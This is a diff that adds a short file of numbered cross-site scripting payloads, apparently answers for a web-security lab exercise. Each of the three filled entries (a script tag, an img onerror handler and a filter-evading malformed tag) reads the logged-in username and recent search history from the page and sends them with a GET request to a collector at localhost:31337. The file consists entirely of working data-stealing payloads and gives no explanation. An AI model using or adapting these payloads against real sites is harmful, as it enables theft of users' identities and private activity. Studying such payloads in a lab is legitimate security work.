@@ -1,0 +1,7 @@
+xss-0: <script> $(function(){var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById("history-list").getElementsByClassName("list-group-item")[1].innerHTML; url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url, function(data){});}); </script>
+
+xss-1: <img src=x onerror = "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}">
+
+xss-2: <scriptimg src=x onerror = "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}" >
+
+xss-3: 
